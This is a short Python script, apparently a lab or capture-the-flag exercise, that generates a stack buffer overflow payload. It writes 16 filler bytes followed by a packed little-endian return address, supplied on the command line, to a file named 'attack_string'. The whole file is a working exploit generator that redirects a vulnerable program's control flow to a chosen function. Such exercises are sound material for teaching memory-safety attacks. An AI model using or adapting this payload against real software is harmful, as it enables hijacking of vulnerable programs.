import sys
import struct

if len(sys.argv) != 2:
    print("Usage: python3 attack.py <target_address>")
    sys.exit(1)

# Extract the target address from the command line argument
target_address = struct.pack('<I', int(sys.argv[1], 16))

# Craft the attack string to trigger buffer overflow and overwrite return address
# 'A' * 16 to fill the buffer and then append the target function address
attack_string = b'A' * 16 + target_address

# Write the attack string to the "attack_string" file
with open('attack_string', 'wb') as file:
    file.write(attack_string)

print(f'Attack string generated and stored in "attack_string" file with target address {sys.argv[1]}')
